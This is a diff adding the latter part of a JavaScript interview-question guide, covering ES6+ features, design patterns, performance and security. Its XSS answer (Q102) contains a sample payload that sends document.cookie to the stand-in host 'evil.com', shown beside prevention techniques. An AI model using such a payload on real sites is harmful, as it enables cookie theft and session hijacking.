+    return prop in target;
+  }
+};
+
+const numbers = new Proxy({}, handler);
+numbers.age = 25;      // "Setting age = 25"
+numbers.age;           // "Getting age" → 25
+numbers.name = "Ravi"; // TypeError: name must be a number!
+"age" in numbers;      // "Checking if age exists" → true
+
+// Real-world use cases:
+// 1. Validation
+// 2. Logging/debugging
+// 3. Reactive systems (Vue 3 uses Proxy for reactivity)
+// 4. Creating observable objects
+// 5. Default values for missing properties
+const withDefaults = new Proxy({}, {
+  get(target, prop) {
+    return prop in target ? target[prop] : 0; // return 0 for any missing property
+  }
+});
+withDefaults.anything; // 0
+```
+
+---
+
+## Q87. Explain Destructuring — arrays, objects, nested, defaults, rest.
+
+**Answer:**
+
+```js
+// Array destructuring:
+const [first, second, ...rest] = [1, 2, 3, 4, 5];
+// first=1, second=2, rest=[3,4,5]
+
+// Skip elements:
+const [,, third] = [1, 2, 3];
+// third=3
+
+// Default values:
+const [a = 10, b = 20] = [5];
+// a=5, b=20 (default, since index 1 is undefined)
+
+// Swap variables:
+let x = 1, y = 2;
+[x, y] = [y, x]; // x=2, y=1
+
+// Object destructuring:
+const { name, age, email = "unknown" } = { name: "Ravi", age: 30 };
+// name="Ravi", age=30, email="unknown" (default)
+
+// Rename while destructuring:
+const { name: userName, age: userAge } = { name: "Ravi", age: 30 };
+// userName="Ravi", userAge=30
+
+// Nested destructuring:
+const { address: { city, pin: { code } } } = {
+  address: { city: "Bangalore", pin: { code: 560001 } }
+};
+
+// Function parameters:
+function displayUser({ name, age, role = "user" }) {
+  console.log(`${name} (${age}) - ${role}`);
+}
+displayUser({ name: "Ravi", age: 30 }); // "Ravi (30) - user"
+
+// Rest in objects:
+const { id, ...rest2 } = { id: 1, name: "Ravi", age: 30 };
+// id=1, rest2={ name: "Ravi", age: 30 }
+```
+
+---
+
+## Q88. Explain Spread operator vs Rest parameters.
+
+**Answer:**
+
+Both use `...` but in opposite contexts:
+
+**Spread** — EXPANDS an iterable into individual elements (in function calls or literals)
+
+```js
+// Spreading into arrays:
+const arr1 = [1, 2, 3];
+const arr2 = [4, 5, 6];
+const combined = [...arr1, ...arr2]; // [1, 2, 3, 4, 5, 6]
+const copy = [...arr1];              // shallow copy
+
+// Spreading into function arguments:
+Math.max(...arr1); // Math.max(1, 2, 3) = 3
+
+// Spreading into objects (shallow merge):
+const defaults = { theme: "light", lang: "en" };
+const user = { lang: "hi", name: "Ravi" };
+const merged = { ...defaults, ...user }; // user overwrites defaults
+// { theme: "light", lang: "hi", name: "Ravi" }
+```
+
+**Rest** — COLLECTS remaining elements into an array (in function parameters or destructuring)
+
+```js
+// Rest in function parameters:
+function sum(first, ...others) {
+  return first + others.reduce((a, b) => a + b, 0);
+}
+sum(1, 2, 3, 4); // 1 + (2+3+4) = 10
+
+// Rest in destructuring:
+const [head, ...tail] = [1, 2, 3, 4];
+// head=1, tail=[2,3,4]
+
+const { id, ...rest } = { id: 1, name: "Ravi", age: 30 };
+// id=1, rest={ name: "Ravi", age: 30 }
+```
+
+---
+
+## Q89. What are Tagged Template Literals?
+
+**Answer:**
+
+Tagged template literals allow you to **process a template literal** with a custom function. The tag function receives the string parts and interpolated values separately.
+
+```js
+// Basic template literal (not tagged):
+const name = "Ravi";
+const message = `Hello, ${name}!`; // "Hello, Ravi!"
+
+// Tagged template literal:
+function highlight(strings, ...values) {
+  // strings: array of string parts
+  // values: array of interpolated values
+  return strings.reduce((result, str, i) => {
+    return result + str + (values[i] !== undefined
+      ? `<strong>${values[i]}</strong>`
+      : "");
+  }, "");
+}
+
+const user = "Ravi";
+const score = 95;
+const html = highlight`User ${user} scored ${score} points!`;
+// "User <strong>Ravi</strong> scored <strong>95</strong> points!"
+
+// Real-world use cases:
+// 1. SQL query sanitization (prevent injection):
+function sql(strings, ...values) {
+  return {
+    text: strings.reduce((q, s, i) => q + s + (values[i] !== undefined ? `$${i}` : ""), ""),
+    params: values
+  };
+}
+const userId = 1;
+const query = sql`SELECT * FROM users WHERE id = ${userId}`;
+// { text: "SELECT * FROM users WHERE id = $1", params: [1] }
+
+// 2. Styled-components (React) use tagged template literals
+const Button = styled.button`
+  background: ${props => props.primary ? "blue" : "white"};
+  color: ${props => props.primary ? "white" : "blue"};
+`;
+```
+
+---
+
+## Q90. What is `WeakRef` and `FinalizationRegistry`?
+
+**Answer:**
+
+`WeakRef` holds a **weak reference** to an object — it doesn't prevent the object from being garbage collected. `FinalizationRegistry` lets you register a callback that runs when an object is collected.
+
+```js
+// WeakRef — useful for caching without preventing GC:
+let largeObject = { data: new Array(1000000) };
+const ref = new WeakRef(largeObject);
+
+largeObject = null; // remove strong reference — object CAN now be GC'd
+
+// Later:
+const obj = ref.deref(); // returns the object, or undefined if GC'd
+if (obj) {
+  console.log("Still alive");
+} else {
+  console.log("Was garbage collected");
+}
+
+// FinalizationRegistry — cleanup when object is collected:
+const registry = new FinalizationRegistry((heldValue) => {
+  console.log(`Object with id ${heldValue} was garbage collected`);
+  // cleanup: close connections, clear timers, etc.
+});
+
+let resource = { connection: "db connection" };
+registry.register(resource, "resource-1"); // second arg = held value passed to callback
+
+resource = null; // when GC'd, callback fires with "resource-1"
+
+// Use with caution — GC timing is non-deterministic
+```
+
+---
+
+## Q91. What is `structuredClone()`?
+
+**Answer:**
+
+`structuredClone()` is a native browser/Node.js function (not JSON-based) that performs a **deep clone** of an object. It handles many types that `JSON.parse(JSON.stringify())` cannot:
+
+```js
+// JSON.parse/stringify limitations:
+const obj = {
+  date: new Date(),        // ❌ becomes string
+  regex: /hello/gi,        // ❌ becomes {}
+  fn: () => {},            // ❌ lost entirely
+  undef: undefined,        // ❌ lost
+  map: new Map([[1, "a"]]) // ❌ becomes {}
+};
+
+// structuredClone handles:
+const clone = structuredClone({
+  date: new Date(),        // ✅ proper Date clone
+  arr: [1, [2, [3]]],     // ✅ deeply cloned
+  map: new Map([[1, "a"]]),// ✅ proper Map clone
+  set: new Set([1, 2, 3]) // ✅ proper Set clone
+});
+
+// What it can't clone:
+// ❌ Functions
+// ❌ DOM nodes
+// ❌ Symbols as keys
+// ❌ Class instances with methods (loses the prototype)
+```
+
+---
+
+## Q92. Explain Optional Chaining (`?.`) and Nullish Coalescing (`??`).
+
+**Answer:**
+
+**Optional Chaining `?.`** — safely access nested properties without throwing if an intermediate value is null/undefined:
+
+```js
+const user = {
+  profile: {
+    address: {
+      city: "Bangalore"
+    }
+  }
+};
+
+// Without optional chaining — verbose and error-prone:
+const city = user && user.profile && user.profile.address && user.profile.address.city;
+
+// With optional chaining — clean:
+const city = user?.profile?.address?.city; // "Bangalore"
+const zip = user?.profile?.address?.zip;   // undefined — no error!
+
+// With methods:
+const upper = user?.profile?.getName?.(); // safe method call
+
+// With arrays:
+const firstItem = arr?.[0]?.name;
+
+// With function calls:
+callIfExists?.(); // only calls if not null/undefined
+```
+
+**Nullish Coalescing `??`** — returns right-hand side only when left is `null` or `undefined` (not for other falsy values like `0` or `""`):
+
+```js
+// || problem — 0 and "" are falsy, treated as "missing":
+const timeout = userConfig.timeout || 3000; // if timeout is 0, falls back to 3000 incorrectly!
+
+// ?? solution — only null/undefined triggers fallback:
+const timeout = userConfig.timeout ?? 3000; // if timeout is 0, keeps 0 ✅
+const port = config.port ?? 8080;           // 0 port stays 0, null/undefined → 8080
+
+// Combined with optional chaining:
+const name = user?.profile?.name ?? "Anonymous";
+```
+
+---
+
+## Q93. What are `Symbol.iterator` and custom iterables?
+
+**Answer:**
+
+An object is **iterable** if it has a `[Symbol.iterator]()` method that returns an **iterator** — an object with a `next()` method that returns `{ value, done }`.
+
+```js
+// Making a custom object iterable:
+const range = {
+  from: 1,
+  to: 5,
+  [Symbol.iterator]() {
+    let current = this.from;
+    const last = this.to;
+    return {
+      next() {
+        if (current <= last) {
+          return { value: current++, done: false };
+        }
+        return { value: undefined, done: true };
+      }
+    };
+  }
+};
+
+// Now range is iterable — works with for...of, spread, destructuring:
+for (const num of range) {
+  console.log(num); // 1, 2, 3, 4, 5
+}
+
+[...range]; // [1, 2, 3, 4, 5]
+const [a, b, c] = range; // a=1, b=2, c=3
+
+// Custom infinite generator:
+function* naturals() {
+  let n = 1;
+  while (true) yield n++;
+}
+
+const gen = naturals();
+gen.next().value; // 1
+gen.next().value; // 2
+// Never exhausted — pull as many as you need
+```
+
+---
+
+---
+
+# 9. Design Patterns
+
+---
+
+## Q94. Implement the `Singleton` pattern in JavaScript.
+
+**Answer:**
+
+```js
+// Singleton ensures only ONE instance of a class is ever created:
+class DatabaseConnection {
+  static #instance = null; // private static field
+
+  #connection = null;
+
+  constructor(url) {
+    if (DatabaseConnection.#instance) {
+      return DatabaseConnection.#instance; // return existing instance
+    }
+    this.#connection = { url, status: "connected" };
+    DatabaseConnection.#instance = this;
+  }
+
+  query(sql) {
+    console.log(`Querying: ${sql}`);
+  }
+
+  static getInstance(url) {
+    if (!DatabaseConnection.#instance) {
+      new DatabaseConnection(url);
+    }
+    return DatabaseConnection.#instance;
+  }
+}
+
+const db1 = DatabaseConnection.getInstance("mongodb://localhost");
+const db2 = DatabaseConnection.getInstance("mongodb://other"); // ignored
+
+console.log(db1 === db2); // true — same instance!
+
+// Module-based Singleton (cleaner, uses JS module system):
+// singleton.js
+let instance = null;
+export function getConnection() {
+  if (!instance) instance = createConnection();
+  return instance;
+}
+```
+
+---
+
+## Q95. Implement the `Observer/Pub-Sub` pattern.
+
+**Answer:**
+
+```js
+class EventBus {
+  #subscribers = new Map();
+
+  subscribe(event, callback, options = {}) {
+    if (!this.#subscribers.has(event)) {
+      this.#subscribers.set(event, []);
+    }
+
+    const handler = { callback, once: options.once || false };
+    this.#subscribers.get(event).push(handler);
+
+    // Return unsubscribe function:
+    return () => this.unsubscribe(event, callback);
+  }
+
+  unsubscribe(event, callback) {
+    if (!this.#subscribers.has(event)) return;
+    const handlers = this.#subscribers.get(event);
+    this.#subscribers.set(
+      event,
+      handlers.filter(h => h.callback !== callback)
+    );
+  }
+
+  publish(event, data) {
+    if (!this.#subscribers.has(event)) return;
+
+    this.#subscribers.get(event).forEach(handler => {
+      handler.callback(data);
+    });
+
+    // Remove once-handlers:
+    this.#subscribers.set(
+      event,
+      this.#subscribers.get(event).filter(h => !h.once)
+    );
+  }
+}
+
+// Usage:
+const bus = new EventBus();
+
+const unsubscribe = bus.subscribe("user:login", (user) => {
+  console.log(`${user.name} logged in`);
+});
+
+bus.subscribe("user:login", (user) => {
+  analytics.track("login", user);
+}, { once: true }); // only fires once
+
+bus.publish("user:login", { name: "Ravi", id: 1 });
+unsubscribe(); // clean up when done
+```
+
+---
+
+## Q96. Implement the `Factory` pattern.
+
+**Answer:**
+
+```js
+// Factory creates objects without exposing creation logic:
+class UserFactory {
+  static create(type, data) {
+    switch (type) {
+      case "admin":
+        return new AdminUser(data);
+      case "moderator":
+        return new ModeratorUser(data);
+      case "guest":
+        return new GuestUser(data);
+      default:
+        throw new Error(`Unknown user type: ${type}`);
+    }
+  }
+}
+
+class AdminUser {
+  constructor({ name }) {
+    this.name = name;
+    this.permissions = ["read", "write", "delete", "manage_users"];
+  }
+}
+
+class GuestUser {
+  constructor({ name }) {
+    this.name = name;
+    this.permissions = ["read"];
+  }
+}
+
+// Usage:
+const admin = UserFactory.create("admin", { name: "Ravi" });
+const guest = UserFactory.create("guest", { name: "Visitor" });
+
+// The caller doesn't need to know the class hierarchy —
+// just asks for what type they need.
+```
+
+---
+
+## Q97. Implement the `Strategy` pattern.
+
+**Answer:**
+
+```js
+// Strategy lets you define a family of algorithms and make them interchangeable:
+class Sorter {
+  constructor(strategy) {
+    this.strategy = strategy;
+  }
+
+  sort(data) {
+    return this.strategy.sort([...data]); // delegate to strategy
+  }
+
+  setStrategy(strategy) {
+    this.strategy = strategy;
+  }
+}
+
+const bubbleSortStrategy = {
+  sort(arr) {
+    for (let i = 0; i < arr.length; i++) {
+      for (let j = 0; j < arr.length - i - 1; j++) {
+        if (arr[j] > arr[j + 1]) [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]];
+      }
+    }
+    return arr;
+  }
+};
+
+const quickSortStrategy = {
+  sort(arr) {
+    if (arr.length <= 1) return arr;
+    const pivot = arr[Math.floor(arr.length / 2)];
+    const left = arr.filter(x => x < pivot);
+    const mid = arr.filter(x => x === pivot);
+    const right = arr.filter(x => x > pivot);
+    return [...this.sort(left), ...mid, ...this.sort(right)];
+  }
+};
+
+const sorter = new Sorter(quickSortStrategy);
+sorter.sort([3, 1, 4, 1, 5, 9]); // [1, 1, 3, 4, 5, 9]
+
+sorter.setStrategy(bubbleSortStrategy); // swap algorithm at runtime
+sorter.sort([3, 1, 4]); // [1, 3, 4]
+
+// Real-world: payment processing, compression algorithms, routing algorithms
+```
+
+---
+
+## Q98. Implement the `Decorator` pattern.
+
+**Answer:**
+
+```js
+// Decorator adds behavior to functions/objects dynamically:
+
+// Function decorator:
+function readonly(target, key, descriptor) {
+  descriptor.writable = false;
+  return descriptor;
+}
+
+// Logging decorator:
+function log(fn) {
+  return function(...args) {
+    console.log(`[${fn.name}] called with:`, args);
+    const result = fn.apply(this, args);
+    console.log(`[${fn.name}] returned:`, result);
+    return result;
+  };
+}
+
+// Timer decorator:
+function measure(fn) {
+  return function(...args) {
+    const start = performance.now();
+    const result = fn.apply(this, args);
+    console.log(`${fn.name} took ${(performance.now() - start).toFixed(2)}ms`);
+    return result;
+  };
+}
+
+// Composing decorators:
+const processData = measure(log(function processData(data) {
+  return data.map(x => x * 2);
+}));
+
+processData([1, 2, 3]);
+// [processData] called with: [[1,2,3]]
+// [processData] returned: [2,4,6]
+// processData took 0.12ms
+```
+
+---
+
+## Q99. Implement an `LRU Cache`.
+
+**Answer:**
+
+LRU (Least Recently Used) Cache evicts the least recently used item when capacity is reached. `Map` in JavaScript maintains insertion order, making it perfect for LRU:
+
+```js
+class LRUCache {
+  #capacity;
+  #cache = new Map(); // Map remembers insertion order
+
+  constructor(capacity) {
+    if (capacity <= 0) throw new Error("Capacity must be positive");
+    this.#capacity = capacity;
+  }
+
+  get(key) {
+    if (!this.#cache.has(key)) return -1;
+
+    // Move to end = mark as most recently used:
+    const value = this.#cache.get(key);
+    this.#cache.delete(key);
+    this.#cache.set(key, value);
+    return value;
+  }
+
+  put(key, value) {
+    if (this.#cache.has(key)) {
+      this.#cache.delete(key); // remove old entry to update order
+    } else if (this.#cache.size >= this.#capacity) {
+      // Evict least recently used (first item in Map):
+      const lruKey = this.#cache.keys().next().value;
+      this.#cache.delete(lruKey);
+    }
+    this.#cache.set(key, value); // add as most recently used
+  }
+
+  get size() { return this.#cache.size; }
+
+  // Optional: peek without updating recency:
+  peek(key) { return this.#cache.get(key) ?? -1; }
+}
+
+// Test:
+const cache = new LRUCache(3);
+cache.put(1, "one");
+cache.put(2, "two");
+cache.put(3, "three");
+cache.get(1);          // "one" — 1 is now MRU
+cache.put(4, "four");  // evicts 2 (LRU)
+cache.get(2);          // -1 — was evicted
+```
+
+---
+
+## Q100. Implement the `Command` pattern with undo/redo.
+
+**Answer:**
+
+```js
+// Command pattern encapsulates actions as objects, enabling undo/redo:
+class TextEditor {
+  #content = "";
+  #history = [];
+  #redoStack = [];
+
+  execute(command) {
+    command.execute(this);
+    this.#history.push(command);
+    this.#redoStack = []; // clear redo stack on new action
+  }
+
+  undo() {
+    const command = this.#history.pop();
+    if (command) {
+      command.undo(this);
+      this.#redoStack.push(command);
+    }
+  }
+
+  redo() {
+    const command = this.#redoStack.pop();
+    if (command) {
+      command.execute(this);
+      this.#history.push(command);
+    }
+  }
+
+  get content() { return this.#content; }
+  set content(val) { this.#content = val; }
+}
+
+class InsertCommand {
+  constructor(text, position) {
+    this.text = text;
+    this.position = position;
+  }
+
+  execute(editor) {
+    editor.content =
+      editor.content.slice(0, this.position) +
+      this.text +
+      editor.content.slice(this.position);
+  }
+
+  undo(editor) {
+    editor.content =
+      editor.content.slice(0, this.position) +
+      editor.content.slice(this.position + this.text.length);
+  }
+}
+
+// Usage:
+const editor = new TextEditor();
+editor.execute(new InsertCommand("Hello", 0));
+editor.execute(new InsertCommand(" World", 5));
+console.log(editor.content); // "Hello World"
+editor.undo();
+console.log(editor.content); // "Hello"
+editor.redo();
+console.log(editor.content); // "Hello World"
+```
+
+---
+
+---
+
+# 10. Performance, Security & Miscellaneous
+
+---
+
+## Q101. What is the difference between `for...in` and `for...of`?
+
+**Answer:**
+
+```js
+// for...in — iterates over ENUMERABLE PROPERTY KEYS (including inherited ones)
+const obj = { a: 1, b: 2, c: 3 };
+for (const key in obj) {
+  console.log(key); // "a", "b", "c"
+}
+
+// Danger — iterates inherited properties too:
+function Animal(name) { this.name = name; }
+Animal.prototype.type = "animal"; // prototype property
+
+const dog = new Animal("Rex");
+for (const key in dog) {
+  console.log(key); // "name", "type" ← inherited!
+}
+// Fix: use hasOwnProperty check
+for (const key in dog) {
+  if (dog.hasOwnProperty(key)) console.log(key); // only "name"
+}
+
+// for...of — iterates over ITERABLE VALUES (arrays, strings, Maps, Sets, generators)
+const arr = [10, 20, 30];
+for (const val of arr) {
+  console.log(val); // 10, 20, 30
+}
+
+for (const char of "hello") {
+  console.log(char); // h, e, l, l, o
+}
+
+// for...of with Map:
+const map = new Map([["a", 1], ["b", 2]]);
+for (const [key, val] of map) {
+  console.log(key, val); // "a" 1, "b" 2
+}
+
+// for...in → keys (objects), for...of → values (iterables)
+```
+
+---
+
+## Q102. What is XSS and how do you prevent it in JavaScript?
+
+**Answer:**
+
+Cross-Site Scripting (XSS) is an attack where malicious scripts are injected into your web pages and executed by other users' browsers.
+
+```js
+// ❌ Vulnerable code:
+const userInput = '<script>document.cookie = fetch("evil.com/?c=" + document.cookie)</script>';
+document.getElementById("output").innerHTML = userInput; // XSS!
+
+// ✅ Safe alternatives:
+
+// 1. Use textContent instead of innerHTML for plain text:
+element.textContent = userInput; // tags are treated as text, not HTML
+
+// 2. Sanitize HTML if you must render it:
+// Use DOMPurify library:
+element.innerHTML = DOMPurify.sanitize(userInput);
+
+// 3. Escape HTML characters manually:
+function escapeHTML(str) {
+  return str
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#x27;");
+}
+
+// 4. Set Content Security Policy (CSP) headers:
+// Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
+
+// 5. Never use eval(), new Function(), setTimeout(string), setInterval(string):
+eval(userInput);              // ❌ executes as code
+setTimeout(userInput, 100);   // ❌ same issue
+```
+
+---
+
+## Q103. What is memory management and garbage collection in JavaScript?
+
+**Answer:**
+
+JavaScript uses **automatic garbage collection** — the engine automatically frees memory that is no longer reachable. The main algorithm is **Mark and Sweep**:
+
+1. GC starts from "roots" (global scope, current call stack)
+2. It marks all objects reachable from roots
+3. It sweeps (frees) any unmarked objects
+
+```js
+// Memory leak patterns to avoid:
+
+// 1. Forgotten event listeners:
+const btn = document.getElementById("btn");
+const handler = () => { /* captures large closure */ };
+btn.addEventListener("click", handler);
+// ❌ Never removed — listener + closure stays in memory even if btn is removed
+btn.removeEventListener("click", handler); // ✅ clean up
+
+// 2. Detached DOM nodes:
+let detached = document.getElementById("modal");
+document.body.removeChild(detached); // removed from DOM
+// ❌ detached variable still holds reference — node can't be GC'd
+detached = null; // ✅ release reference
+
+// 3. Timers not cleared:
+const id = setInterval(updateData, 1000);
+// ❌ interval keeps running and holding references even after component unmounts
+clearInterval(id); // ✅ in cleanup
+
+// 4. Global variables:
+// ❌ Accidental global (without let/const/var):
+function fn() {
+  leakedVar = "oops"; // creates global variable!
+}
+// ✅ Always declare variables with const/let
+
+// 5. Closures capturing large objects (covered in Q21)
+
+// Tools: Chrome DevTools Memory tab, heap snapshots, allocation timelines
+```
+
+---
+
+## Q104. Explain `requestAnimationFrame` vs `setTimeout` for animations.
+
+**Answer:**
+
+```js
+// setTimeout — unreliable timing for animations:
+function animate() {
+  updatePosition();
+  setTimeout(animate, 16); // ~60fps, but not synced to display!
+}
+// Problems:
+// - May fire between screen refreshes (wasted frames)
+// - May fire too late (dropped frames)
+// - Keeps running even when tab is hidden
+
+// requestAnimationFrame — optimized for animations:
+let animationId;
+
+function animate(timestamp) {
+  // timestamp is DOMHighResTimeStamp — precise timing
+  const delta = timestamp - lastTimestamp;
+  updatePosition(delta);
+  lastTimestamp = timestamp;
+
+  animationId = requestAnimationFrame(animate); // schedule next frame
+}
+
+let lastTimestamp = 0;
+animationId = requestAnimationFrame(animate); // start
+
+// Stop animation:
+cancelAnimationFrame(animationId);
+
+// Advantages of rAF:
+// ✅ Synced to monitor refresh rate (60fps, 120fps, etc.)
+// ✅ Automatically pauses when tab is hidden (saves CPU/battery)
+// ✅ Batches repaints for smooth animation
+// ✅ Accurate timestamp for delta-based movement
+
+// Smooth scroll implementation:
+function smoothScrollTo(targetY, duration = 500) {
+  const startY = window.scrollY;
+  const distance = targetY - startY;
+  let startTime = null;
+
+  function step(timestamp) {
+    if (!startTime) startTime = timestamp;
+    const progress = Math.min((timestamp - startTime) / duration, 1);
+    const eased = easeInOutQuad(progress); // easing function
+    window.scrollTo(0, startY + distance * eased);
+    if (progress < 1) requestAnimationFrame(step);
+  }
+
+  requestAnimationFrame(step);
+}
+```
+
+---
+
+## Q105. What is lazy loading and how do you implement it?
+
+**Answer:**
+
+Lazy loading defers loading non-critical resources until they are actually needed, improving initial page load performance.
+
+```js
+// 1. Native lazy loading for images (HTML):
+// <img src="photo.jpg" loading="lazy" alt="photo">
+
+// 2. IntersectionObserver for custom lazy loading:
+const imageObserver = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      const img = entry.target;
+      img.src = img.dataset.src;  // replace placeholder with real src
+      img.removeAttribute("data-src");
+      imageObserver.unobserve(img);
+    }
+  });
+}, { rootMargin: "200px" }); // start loading 200px before visible
+
+document.querySelectorAll("img[data-src]").forEach(img => {
+  imageObserver.observe(img);
+});
+
+// 3. Dynamic import for code splitting (lazy load JS modules):
+button.addEventListener("click", async () => {
+  // Only loads the module when the button is clicked:
+  const { HeavyComponent } = await import("./HeavyComponent.js");
+  const chart = new HeavyComponent();
+  chart.render();
+});
+
+// 4. React lazy loading:
+const HeavyPage = React.lazy(() => import("./HeavyPage"));
+// Use with Suspense:
+<Suspense fallback={<Loading />}>
+  <HeavyPage />
+</Suspense>
+```
+
+---
+
+## Q106. What are Web Workers? When would you use them?
+
+**Answer:**
+
+Web Workers run JavaScript in a **background thread**, separate from the main thread. This prevents heavy computation from blocking the UI.
+
+```js
+// main.js — main thread
+const worker = new Worker("worker.js");
+
+// Send data to worker:
+worker.postMessage({ data: [1, 2, 3, ...largeArray], operation: "sort" });
+
+// Receive results from worker:
+worker.onmessage = function(event) {
+  const sorted = event.data;
+  renderResults(sorted); // update UI on main thread
+};
+
+worker.onerror = (err) => console.error("Worker error:", err);
+
+// Terminate worker when done:
+worker.terminate();
+
+// worker.js — background thread
+self.onmessage = function(event) {
+  const { data, operation } = event.data;
+
+  // Heavy computation that would normally freeze the UI:
+  if (operation === "sort") {
+    const sorted = data.sort((a, b) => a - b);
+    self.postMessage(sorted); // send back to main thread
+  }
+};
+
+// Use cases for Web Workers:
+// ✅ Sorting/filtering huge datasets
+// ✅ Image/video processing
+// ✅ Cryptographic operations
+// ✅ Real-time data processing (stocks, analytics)
+// ✅ Complex calculations (physics simulations, ML inference)
+```
+
+---
+
+## Q107. Explain `Object.keys()`, `Object.values()`, `Object.entries()` and when to use each.
+
+**Answer:**
+
+```js
+const user = { name: "Ravi", age: 30, city: "Bangalore" };
+
+// Object.keys() — array of own enumerable string keys:
+Object.keys(user);    // ["name", "age", "city"]
+
+// Object.values() — array of own enumerable values:
+Object.values(user);  // ["Ravi", 30, "Bangalore"]
+
+// Object.entries() — array of [key, value] pairs:
+Object.entries(user); // [["name","Ravi"], ["age",30], ["city","Bangalore"]]
+
+// Practical use cases:
+
+// Iterate over an object:
+for (const [key, value] of Object.entries(user)) {
+  console.log(`${key}: ${value}`);
+}
+
+// Transform object values:
+const doubled = Object.fromEntries(
+  Object.entries({ a: 1, b: 2, c: 3 }).map(([k, v]) => [k, v * 2])
+);
+// { a: 2, b: 4, c: 6 }
+
+// Filter object by condition:
+const adults = Object.fromEntries(
+  Object.entries({ Ravi: 30, Teen: 16, Priya: 25 })
+    .filter(([, age]) => age >= 18)
+);
+// { Ravi: 30, Priya: 25 }
+
+// Note: all three only return OWN, ENUMERABLE, STRING-keyed properties
+// Symbol keys: use Object.getOwnPropertySymbols()
+// Non-enumerable: use Object.getOwnPropertyDescriptors()
+```
+
+---
+
+## Q108. What are the differences between `==`, `===`, and `Object.is()`?
+
+This was covered in Q8 above, but here's a comparison table for quick reference:
+
+```js
+                   ==          ===         Object.is()
+NaN vs NaN:       false       false        true   ← Object.is wins
++0 vs -0:         true        true         false  ← Object.is wins
+null vs undefined: true       false        false
+1 vs "1":         true        false        false
+null vs null:     true        true         true
+undefined vs undefined: true  true         true
+```
+
+---
+
+## Q109. How does the `for...await...of` loop work?
+
+**Answer:**
+
+`for await...of` is used to iterate over **async iterables** — sources that produce values asynchronously, like streams or batched API responses.
+
+```js
+// Async generator — produces values asynchronously:
+async function* fetchPages(userId) {
+  let page = 1;
+  while (true) {
+    const response = await fetch(`/api/users/${userId}/posts?page=${page}`);
+    const data = await response.json();
+    if (data.posts.length === 0) return; // done
+    yield data.posts; // yield each page
+    page++;
+  }
+}
+
+// Consuming with for await...of:
+async function loadAllPosts(userId) {
+  const allPosts = [];
+  for await (const posts of fetchPages(userId)) {
+    allPosts.push(...posts);
+    renderNewPosts(posts); // show incrementally as they arrive
+  }
+  return allPosts;
+}
+
+// Works with any async iterable:
+async function readStream(stream) {
+  for await (const chunk of stream) {
+    process(chunk);
+  }
+}
+```
+
+---
+
+## Q110. What are the best practices for writing performant JavaScript?
+
+**Answer:**
+
+```js
+// 1. Avoid layout thrashing — batch DOM reads and writes:
+// ❌ Causes layout thrash (read, write, read, write...):
+elements.forEach(el => {
+  const height = el.offsetHeight; // READ (forces layout)
+  el.style.height = height * 2 + "px"; // WRITE
+});
+
+// ✅ Batch reads, then writes:
+const heights = elements.map(el => el.offsetHeight); // all READs
+elements.forEach((el, i) => el.style.height = heights[i] * 2 + "px"); // all WRITEs
+
+// 2. Debounce/throttle event-heavy handlers (Q69)
+
+// 3. Use DocumentFragment for bulk DOM insertions:
+const fragment = document.createDocumentFragment();
+items.forEach(item => {
+  const li = document.createElement("li");
+  li.textContent = item;
+  fragment.appendChild(li);
+});
+list.appendChild(fragment); // single reflow/repaint
+
+// 4. Cache expensive calculations:
+// ❌ Recalculates length every iteration:
+for (let i = 0; i < array.length; i++) {}
+// ✅ Cache length:
+for (let i = 0, len = array.length; i < len; i++) {}
+
+// 5. Avoid memory leaks (Q103)
+
+// 6. Use appropriate data structures:
+// Lookup by key → Object or Map (O(1)) not Array.find (O(n))
+const userMap = new Map(users.map(u => [u.id, u]));
+userMap.get(targetId); // O(1) vs users.find(u => u.id === targetId) O(n)
+
+// 7. Use virtualization for long lists (react-window, react-virtual)
+// Only render items in the viewport
+
+// 8. Code splitting and lazy loading (Q105)
+
+// 9. Avoid synchronous operations that block the main thread:
+// Use Web Workers for heavy computation (Q106)
+// Use async/await for I/O
+
+// 10. Prefer CSS animations over JS animations:
+// CSS transitions run on the compositor thread — don't block JS
+// Use transform and opacity for GPU-accelerated animations
+// Only use JS (rAF) when CSS can't achieve the desired effect
+```
+
+---
+
+---
+
+# 📌 Bonus Quick-Fire Output Questions
+
+---
+
+## Q111–Q115: Predict the Output
+
+```js
+// Q111:
+console.log(typeof typeof 1);
+// typeof 1 → "number" (string)
+// typeof "number" → "string"
+// Output: "string"
+
+// Q112:
+let a = { x: 1 };
+let b = a;
+a = { x: 2 };
+console.log(b.x); // 1 — b still points to original object, a was reassigned
+
+// Q113:
+const arr = [1, 2, 3];
+const [first, ...rest] = arr;
+rest.push(4);
+console.log(arr); // [1, 2, 3] — rest is a new array, arr is unaffected
+
+// Q114:
+async function test() {
+  return 1;
+}
+console.log(test()); // Promise { 1 } — async functions always return a Promise
+test().then(console.log); // 1
+
+// Q115:
+function* gen() {
+  const x = yield 1;
+  const y = yield 2;
+  return x + y;
+}
+
+const g = gen();
+console.log(g.next());    // { value: 1, done: false }
+console.log(g.next(10));  // { value: 2, done: false } — 10 is assigned to x
+console.log(g.next(20));  // { value: 30, done: true }  — 20 is assigned to y, x+y=30
+```
+
+---
+
+---
+
+# 🎯 Topic-Wise Coverage Summary
+
+| # | Topic | Questions |
+|---|---|---|
+| 1 | Data Types & Type Coercion | Q1–Q10 |
+| 2 | Scope, Hoisting & Closures | Q11–Q22 |
+| 3 | Prototypes, OOP & `this` | Q23–Q33 |
+| 4 | Async JS & Event Loop | Q34–Q50 |
+| 5 | Array & Object Methods / Polyfills | Q51–Q65 |
+| 6 | Functional Programming | Q66–Q75 |
+| 7 | DOM, Events & Browser APIs | Q76–Q84 |
+| 8 | ES6+ Modern JavaScript | Q85–Q93 |
+| 9 | Design Patterns | Q94–Q100 |
+| 10 | Performance, Security & Misc | Q101–Q110 |
+| 11 | Quick-Fire Output Questions | Q111–Q115 |
+
+---
+
+> 💡 **Pro Tip for Indian IT Interviews:**
+>
+> **TCS / Infosys / Wipro / HCL / Cognizant** — Focus heavily on Q1–Q22 (types, scope, closures), output-based questions (Q109, Q111–Q115), and basic async (Q34–Q37).
+>
+> **Capgemini / Mphasis / LTIMindtree** — Q23–Q50 (prototypes, OOP, async), polyfills (Q51–Q65), and ES6+ (Q85–Q93).
+>
